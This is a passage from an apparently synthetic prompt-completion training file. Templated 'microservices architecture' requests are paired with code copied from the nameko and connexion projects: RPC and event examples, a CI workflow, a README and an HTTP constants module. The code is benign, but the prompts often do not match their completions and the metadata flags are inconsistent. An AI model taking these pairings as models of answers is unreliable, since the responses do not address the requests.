"authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.rpc import rpc, RpcProxy\n\nclass Service:\n    name = \"service\"\n\n    # we depend on the RPC interface of \"another_service\"\n    other_rpc = RpcProxy(\"another_service\")\n\n    @rpc  # `method` is exposed over RPC\n    def method(self):\n        # application logic goes here\n        pass\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/anatomy.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 13}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "with ClusterRpcProxy(config) as cluster_rpc:\n    hello_res = cluster_rpc.service_x.remote_method.call_async(\"hello\")\n    world_res = cluster_rpc.service_x.remote_method.call_async(\"world\")\n    # do work while waiting\n    hello_res.result()  # \"hello-x-y\"\n    world_res.result()  # \"world-x-y\"\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/async_rpc.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.43, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 7}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.dependency_providers import Config\nfrom nameko.web.handlers import http\n\n\nclass Service:\n\n    name = \"test_config\"\n\n    config = Config()\n\n    @property\n    def foo_enabled(self):\n        return self.config.get('FOO_FEATURE_ENABLED', False)\n\n    @http('GET', '/foo')\n    def foo(self, request):\n        if not self.foo_enabled:\n            return 403, \"FeatureNotEnabled\"\n\n        return 'foo'\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/config_dependency_provider.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.78, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 21}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.events import BROADCAST, event_handler\n\nclass ListenerService:\n    name = \"listener\"\n\n    @event_handler(\n        \"monitor\", \"ping\", handler_type=BROADCAST, reliable_delivery=False\n    )\n    def ping(self, payload):\n        # all running services will respond\n        print(\"pong from {}\".format(self.name))\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/event_broadcast.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 12}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.events import EventDispatcher, event_handler\nfrom nameko.rpc import rpc\n\nclass ServiceA:\n    \"\"\" Event dispatching service. \"\"\"\n    name = \"service_a\"\n\n    dispatch = EventDispatcher()\n\n    @rpc\n    def dispatching_method(self, payload):\n        self.dispatch(\"event_type\", payload)\n\n\nclass ServiceB:\n    \"\"\" Event listening service. \"\"\"\n    name = \"service_b\"\n\n    @event_handler(\"service_a\", \"event_type\")\n    def handle_event(self, payload):\n        print(\"service b received:\", payload)\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/events.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.75, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 22}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.rpc import rpc\n\nfrom .auth import Auth, Unauthorized\n\n\nclass Service:\n    name = \"service\"\n\n    auth = Auth()\n\n    @rpc(expected_exceptions=Unauthorized)\n    def update(self, data):\n        if not self.auth.has_role(\"admin\"):\n            raise Unauthorized()\n\n        # perform update\n        raise TypeError(\"Whoops, genuine error.\")\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/expected_exceptions.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 18}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.rpc import rpc\n\nclass GreetingService:\n    name = \"greeting_service\"\n\n    @rpc\n    def hello(self, name):\n        return u\"Hello, {}!\".format(name)\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/helloworld.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.52, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 9}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# http.py\n\nimport json\nfrom nameko.web.handlers import http\n\nclass HttpService:\n    name = \"http_service\"\n\n    @http('GET', '/get/<int:value>')\n    def get_method(self, request, value):\n        return json.dumps({'value': value})\n\n    @http('POST', '/post')\n    def do_post(self, request):\n        return u\"received: {}\".format(request.get_data(as_text=True))\n\n    @http('GET,PUT,POST,DELETE', '/multi')\n    def do_multi(self, request):\n        return request.method\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/http.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 20}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nfrom nameko.web.handlers import HttpRequestHandler\nfrom werkzeug.wrappers import Response\nfrom nameko.exceptions import safe_for_serialization\n\n\nclass HttpError(Exception):\n    error_code = 'BAD_REQUEST'\n    status_code = 400\n\n\nclass InvalidArgumentsError(HttpError):\n    error_code = 'INVALID_ARGUMENTS'\n\n\nclass HttpEntrypoint(HttpRequestHandler):\n    def response_from_exception(self, exc):\n        if isinstance(exc, HttpError):\n            response = Response(\n                json.dumps({\n                    'error': exc.error_code,\n                    'message': safe_for_serialization(exc),\n                }),\n                status=exc.status_code,\n                mimetype='application/json'\n            )\n            return response\n        return HttpRequestHandler.response_from_exception(self, exc)\n\n\nhttp = HttpEntrypoint.decorator\n\n\nclass Service:\n    name = \"http_service\"\n\n    @http('GET', '/custom_exception')\n    def custom_exception(self, request):\n        raise InvalidArgumentsError(\"Argument `foo` is required.\")\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/http_exceptions.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 40}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.rpc import rpc, RpcProxy\n\nclass ServiceY:\n    name = \"service_y\"\n\n    @rpc\n    def append_identifier(self, value):\n        return u\"{}-y\".format(value)\n\n\nclass ServiceX:\n    name = \"service_x\"\n\n    y = RpcProxy(\"service_y\")\n\n    @rpc\n    def remote_method(self, value):\n        res = u\"{}-x\".format(value)\n        return self.y.append_identifier(res)\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/rpc.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 20}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.rpc import rpc\n\nfrom .auth import Auth, Unauthenticated\n\n\nclass Service:\n    name = \"service\"\n\n    auth = Auth()\n\n    @rpc(sensitive_arguments=\"password\", expected_exceptions=Unauthenticated)\n    def login(self, username, password):\n        # raises Unauthenticated if username/password do not match\n        return self.auth.authenticate(username, password)\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/sensitive_arguments.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 15}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.containers import ServiceContainer\n\nclass Service:\n    name = \"service\"\n\n# create a container\ncontainer = ServiceContainer(Service, config={})\n\n# ``container.extensions`` exposes all extensions used by the service\nservice_extensions = list(container.extensions)\n\n# start service\ncontainer.start()\n\n# stop service\ncontainer.stop()\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/service_container.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 17}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from nameko.runners import ServiceRunner\nfrom nameko.testing.utils import get_container\n\nclass ServiceA:\n    name = \"service_a\"\n\nclass ServiceB:\n    name = \"service_b\"\n\n# create a runner for ServiceA and ServiceB\nrunner = ServiceRunner(config={})\nrunner.add_service(ServiceA)\nrunner.add_service(ServiceB)\n\n# ``get_container`` will return the container for a particular service\ncontainer_a = get_container(runner, ServiceA)\n\n# start both services\nrunner.start()\n\n# stop both services\nrunner.stop()\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/service_runner.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.72, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 23}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from .sqs_receive import receive\n\n\nclass SqsService(object):\n    name = \"sqs-service\"\n\n    @receive('https://sqs.eu-west-1.amazonaws.com/123456789012/nameko-sqs')\n    def handle_sqs_message(self, body):\n        \"\"\" This method is called by the `receive` entrypoint whenever\n        a message sent to the given SQS queue.\n        \"\"\"\n        print(body)\n        return body\n", "metadata": {"source": "github.com/nameko/nameko", "file_path": "docs/examples/sqs_service.py", "language": "python", "complexity": "simple", "star_count": 4742, "quality_score": 0.75, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 14}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Test pipeline\non:\n  push:\n    branches:\n      - main\n  pull_request:\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        python-version: ['3.8', '3.9', '3.10', '3.11', '3.12']\n    steps:\n    - uses: actions/checkout@v2\n    - name: Set up Python ${{ matrix.python-version }}\n      uses: actions/setup-python@v2\n      with:\n        python-version: ${{ matrix.python-version }}\n    - name: Install dependencies\n      run: |\n        pip install --upgrade pip\n        pip install \"poetry<2\" \"tox<4\" \"tox-gh-actions<3\" \"coveralls<4\"\n    - name: Test with tox\n      run: tox\n    - name: Coveralls\n      run: coveralls --service github\n      env:\n        COVERALLS_PARALLEL: true\n        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        COVERALLS_FLAG_NAME: test-${{ matrix.python-version }}\n\n  finish-coveralls:\n    needs: test\n    runs-on: ubuntu-latest\n    steps:\n    - name: Install \"coveralls<4\"\n      run: pip install coveralls\n    - name: Coveralls Finished\n      run: coveralls --service github --finish\n      env:\n        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": ".github/workflows/pipeline.yml", "language": "yaml", "complexity": "simple", "star_count": 4553, "quality_score": 0.6, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 42}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": " <a id=\"top\"></a>\n <p align=\"center\">\n     <img src=\"https://raw.githubusercontent.com/spec-first/connexion/main/docs/images/logo_banner.svg\" width=\"100%\"/>\n </p>\n <p align=\"center\">\n     <a href=\"https://pypi.org/project/connexion\"><img alt=\"coveralls\" src=\"https://img.shields.io/pypi/status/connexion.svg?style=flat-square&color=brightgreen\"></a>\n     <a href=\"https://pypi.org/project/connexion\"><img alt=\"PyPI version\" src=\"https://img.shields.io/pypi/v/connexion?color=brightgreen&style=flat-square\"></a>\n     <a href=\"https://pypistats.org/packages/connexion\"><img alt=\"PyPI\" src=\"https://img.shields.io/pypi/dm/connexion?style=flat-square&color=brightgreen\"></a>\n     <a href=\"https://github.com/spec-first/connexion/blob/main/LICENSE\"><img alt=\"License\" src=\"https://img.shields.io/pypi/l/connexion?style=flat-square&color=brightgreen\"></a>\n     <a href=\"https://github.com/spec-first/connexion/actions/workflows/pipeline.yml\"><img alt=\"GitHub Workflow Status\" src=\"https://img.shields.io/github/actions/workflow/status/spec-first/connexion/pipeline.yml?style=flat-square\"></a>\n     <a href=\"https://coveralls.io/github/spec-first/connexion?branch=main\"><img alt=\"Coveralls\" src=\"https://img.shields.io/coverallsCoverage/github/spec-first/connexion?style=flat-square\"></a>\n     <a href=\"https://gurubase.io/g/connexion\"><img alt=\"Gurubase\" src=\"https://img.shields.io/badge/Gurubase-Ask%20Connexion%20Guru-brightgreen?style=flat-square\"></a>\n     <br>\n     <br>\n     <a href=\"https://connexion.readthedocs.io/en/stable/\"><strong>Explore the docs »</strong></a>\n </p>\n\n---\n\nConnexion is a modern Python web framework that makes spec-first and api-first development easy.\nYou describe your API in an [OpenAPI][OpenAPI] (or [Swagger][Swagger]) specification with as much \ndetail as you want and Connexion will guarantee that it works as you specified.\n\nIt works either standalone, or in combination with any ASGI or WSGI-compatible framework!\n\n<p align=\"center\">\n   <br>\n   <a href=\"https://connexion.readthedocs.io/en/latest/v3.html\"><strong>📢 Connexion 3 was recently released! Read about the changes here »</strong></a>\n   <br>\n   <br>\n</p>\n\n## ✨ Features\n\nConnexion provides the following functionality **based on your specification**:\n\n- 🚏 **Automatic route registration**, no ``@route`` decorators needed\n- 🔒 **Authentication**, split from your application logic\n- 🔎 **Request and response validation** of headers, parameters, and body\n- 📬 **Parameter parsing and injection**, no request object needed\n- 📨 **Response serialization**, you can return regular Python objects\n- 📺 **A Swagger UI console** with live documentation and ‘try it out’ feature\n- 🧩 **Pluggability**, in all dimensions\n\nConnexion also **helps you write your OpenAPI specification** and develop against it by providing a command line interface which lets you test and mock your specification.\n\n```shell\n   connexion run openapi.yaml\n```\n\n <p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n\n## 🫶 Sponsors\n\n<a href=\"https://www.ml6.eu\"><img src=\"https://raw.githubusercontent.com/spec-first/connexion/main/docs/images/sponsors/ML6.png\" title=ML6 height=\"100\"></a>\n<a href=\"https://www.devmark.ai/fern/?utm_source=connexion&utm_loc=readme&utm_type=logo\"><img src=\"https://raw.githubusercontent.com/spec-first/connexion/main/docs/images/sponsors/Fern.png\" title=Fern height=\"100\"></a>\n\nSponsors help us dedicate time to maintain Connexion. Want to help?\n\n<a href=\"https://github.com/sponsors/spec-first\"><strong>Explore the options »</strong></a>\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n## 🪤 Why Connexion\n\nWith Connexion, you write the spec first. Connexion then calls your Python\ncode, handling the mapping from the specification to the code. This\nincentivizes you to write the specification so that all of your\ndevelopers can understand what your API does, even before you write a\nsingle line of code.\n\nIf multiple teams depend on your APIs, you can use Connexion to easily\nsend them the documentation of your API. This guarantees that your API will\nfollow the specification that you wrote. This is a different process from\nthe one offered by most frameworks, which generate a specification\n*after* you've written the code.\nSome disadvantages of generating specifications based on code is that\nthey often end up lacking details or mix your documentation with the implementation\nlogic of your application.\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n## ⚒️ How to Use\n\n### Installation\n\nYou can install connexion using pip:\n\n```shell\n    $ pip install connexion\n```\n\nConnexion provides 'extras' with optional dependencies to unlock additional features:\n\n- `swagger-ui`: Enables a Swagger UI console for your application.\n- `uvicorn`: Enables to run the your application using `app.run()` for\n  development instead of using an external ASGI server.\n- `flask`: Enables the `FlaskApp` to build applications compatible with the Flask\n  ecosystem.\n\nYou can install them as follows:\n\n```shell\n    $ pip install connexion[swagger-ui]\n    $ pip install connexion[swagger-ui,uvicorn]\n```\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n### Creating your application\n\nConnexion can be used either as a standalone application or as a middleware wrapping an existing\nASGI (or WSGI) application written using a different framework. The standalone application can be\nbuilt using either the `AsyncApp` or `FlaskApp`.\n\n- The `AsyncApp` is a lightweight application with native asynchronous support. Use it if you\n  are starting a new project and have no specific reason to use one of the other options.\n\n  ```Python\n      from connexion import AsyncApp\n\n      app = AsyncApp(__name__)\n  ```\n\n- The `FlaskApp` leverages the `Flask` framework, which is useful if you're migrating from\n  connexion 2.X or you want to leverage the `Flask` ecosystem.\n\n  ```python\n      from connexion import FlaskApp\n\n      app = FlaskApp(__name__)\n  ```\n\n- The `ConnexionMiddleware` can be wrapped around any existing ASGI or WSGI application.\n  Use it if you already have an application written in a different framework and want to add\n  functionality provided by connexion\n\n  ```python\n      from asgi_framework import App\n      from connexion import ConnexionMiddleware\n\n      app = App(__name__)\n      app = ConnexionMiddleware(app)\n  ```\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n### Registering an API\n\nWhile you can register individual routes on your application, Connexion really shines when you\nregister an API defined by an OpenAPI (or Swagger) specification.\nThe operation described in your specification is automatically linked to your Python view function via the ``operationId``\n\n**run.py**\n\n```python\n   def post_greeting(name: str, greeting: str):  # Paramaeters are automatically unpacked\n       return f\"{greeting} {name}\", 200          # Responses are automatically serialized\n\n   app.add_api(\"openapi.yaml\")\n```\n\n**openapi.yaml**\n\n```yaml\n   ...\n   paths:\n     /greeting/{name}:\n       post:\n         operationId: run.post_greeting\n         responses:\n           '200':\n             content:\n               text/plain:\n                 schema:\n                   type: string\n         parameters:\n           - name: name\n             in: path\n             required: true\n             schema:\n               type: string\n           - name: greeting\n             in: query\n             required: true\n             schema:\n               type: string\n```\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n### Running your application\n\nIf you installed connexion using `connexion[uvicorn]`, you can run it using the\n`run` method. This is only recommended for development:\n\n```python\n    app.run()\n```\n\nIn production, run your application using an ASGI server such as `uvicorn`. If you defined your\n`app` in a python module called `run.py`, you can run it as follows:\n\n```shell\n    $ uvicorn run:app\n```\n\nOr with gunicorn:\n\n```shell\n    $ gunicorn -k uvicorn.workers.UvicornWorker run:app\n```\n\n----\n\nNow you're able to run and use Connexion!\n\nSee the [examples][examples] folder for more examples.\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n## 📜 Changes\n\nA full changelog is maintained on the [GitHub releases page][Releases].\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n## 🤲 Contributing\n\nWe welcome your ideas, issues, and pull requests. Just follow the\nusual/standard GitHub practices.\n\nFor easy development, install connexion using poetry with all extras, and\ninstall the pre-commit hooks to automatically run black formatting and static analysis checks.\n\n```shell\n    pip install poetry\n    poetry install --all-extras\n    pre-commit install\n```\n\nYou can find out more about how Connexion works and where to apply your changes by having a look\nat our [architecture][Architecture].\n\nUnless you explicitly state otherwise in advance, any non trivial\ncontribution intentionally submitted for inclusion in this project by you\nto the steward of this repository shall be under the\nterms and conditions of Apache License 2.0 written below, without any\nadditional copyright information, terms or conditions.\n\n<p align=\"right\">(<a href=\"#top\">back to top</a>)</p>\n\n## 🙏 Thanks\n\nWe'd like to thank all of Connexion's contributors for working on this\nproject, Swagger/OpenAPI for their support, and Zalando for originally developing and releasing Connexion.\n\n## 📚 Recommended Resources\n\nAbout the advantages of working spec-first:\n\n* [Blog Atlassian][Blog Atlassian]\n* [API guidelines Zalando][API guidelines Zalando]\n* [Blog ML6][Blog ML6]\n* [Blog Zalando][Blog Zalando]\n\nTools to help you work spec-first:\n\n* [Online swagger editor][Online swagger editor]\n* [VS Code plugin][VS Code plugin]\n* [Pycharm plugin][Pycharm plugin]\n\n[OpenAPI]: https://openapis.org/\n[Swagger]: http://swagger.io/open-source-integrations/\n[Blog atlassian]: https://www.atlassian.com/blog/technology/spec-first-api-development\n[Blog ML6]: https://blog.ml6.eu/why-we-decided-to-help-maintain-connexion-c9f449877083\n[Blog Zalando]: https://engineering.zalando.com/posts/2016/12/crafting-effective-microservices-in-python.html\n[API guidelines Zalando]: https://opensource.zalando.com/restful-api-guidelines/#api-first\n[Online swagger editor]: https://editor.swagger.io/\n[VS Code plugin]: https://marketplace.visualstudio.com/items?itemName=42Crunch.vscode-openapi\n[Pycharm plugin]: https://plugins.jetbrains.com/plugin/14837-openapi-swagger-editor\n[examples]: https://github.com/spec-first/connexion/blob/main/examples\n[Releases]: https://github.com/spec-first/connexion/releases\n[Architecture]: https://github.com/spec-first/connexion/blob/main/docs/images/architecture.png\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "README.md", "language": "markdown", "complexity": "complex", "star_count": 4553, "quality_score": 0.69, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 286}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "\"\"\"\nThis module contains definitions of the HTTP protocol.\n\"\"\"\n\nFORM_CONTENT_TYPES = [\"application/x-www-form-urlencoded\", \"multipart/form-data\"]\n\nMETHODS = {\"get\", \"put\", \"post\", \"delete\", \"options\", \"head\", \"patch\", \"trace\"}\n\nHTTP_STATUS_CODES = {\n    100: \"Continue\",\n    101: \"Switching Protocols\",\n    102: \"Processing\",\n    103: \"Early Hints\",  # see RFC 8297\n    200: \"OK\",\n    201: \"Created\",\n    202: \"Accepted\",\n    203: \"Non Authoritative Information\",\n    204: \"No Content\",\n    205: \"Reset Content\",\n    206: \"Partial Content\",\n    207: \"Multi Status\",\n    208: \"Already Reported\",  # see RFC 5842\n    226: \"IM Used\",  # see RFC 3229\n    300: \"Multiple Choices\",\n    301: \"Moved Permanently\",\n    302: \"Found\",\n    303: \"See Other\",\n    304: \"Not Modified\",\n    305: \"Use Proxy\",\n    306: \"Switch Proxy\",  # unused\n    307: \"Temporary Redirect\",\n    308: \"Permanent Redirect\",\n    400: \"Bad Request\",\n    401: \"Unauthorized\",\n    402: \"Payment Required\",  # unused\n    403: \"Forbidden\",\n    404: \"Not Found\",\n    405: \"Method Not Allowed\",\n    406: \"Not Acceptable\",\n    407: \"Proxy Authentication Required\",\n    408: \"Request Timeout\",\n    409: \"Conflict\",\n    410: \"Gone\",\n    411: \"Length Required\",\n    412: \"Precondition Failed\",\n    413: \"Request Entity Too Large\",\n    414: \"Request URI Too Long\",\n    415: \"Unsupported Media Type\",\n    416: \"Requested Range Not Satisfiable\",\n    417: \"Expectation Failed\",\n    418: \"I'm a teapot\",  # see RFC 2324\n    421: \"Misdirected Request\",  # see RFC 7540\n    422: \"Unprocessable Entity\",\n    423: \"Locked\",\n    424: \"Failed Dependency\",\n    425: \"Too Early\",  # see RFC 8470\n    426: \"Upgrade Required\",\n    428: \"Precondition Required\",  # see RFC 6585\n    429: \"Too Many Requests\",\n    431: \"Request Header Fields Too Large\",\n    449: \"Retry With\",  # proprietary MS extension\n    451: \"Unavailable For Legal Reasons\",\n    500: \"Internal Server Error\",\n    501: \"Not Implemented\",\n    502: \"Bad Gateway\",\n    503: \"Service Unavailable\",\n    504: \"Gateway Timeout\",\n    505: \"HTTP Version Not Supported\",\n    506: \"Variant Also Negotiates\",  # see RFC 2295\n    507: \"Insufficient Storage\",\n    508: \"Loop Detected\",  # see RFC 5842\n    510: \"Not Extended\",\n    511: \"Network Authentication 